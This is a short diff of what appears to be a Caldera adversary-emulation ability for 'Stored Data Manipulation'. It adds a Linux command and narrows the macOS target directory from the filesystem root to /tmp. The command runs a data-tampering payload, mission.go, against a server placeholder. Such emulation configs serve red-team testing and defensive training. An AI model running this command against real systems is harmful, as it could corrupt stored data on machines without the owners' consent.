@@ -8,10 +8,15 @@
     attack_id: T1492
     name: Stored Data Manipulation
   platforms:
+    linux:
+      sh:
+        command: |
+          ./mission.go -server #{server} -duration 60 -message 'caldera wuz here' -dir '/tmp'
+        payload: mission.go
     darwin:
       sh:
         command: |
-          ./mission.go -server #{server} -duration 60 -message 'caldera wuz here' -dir '/'
+          ./mission.go -server #{server} -duration 60 -message 'caldera wuz here' -dir '/tmp'
         payload: mission.go
     windows:
       psh:
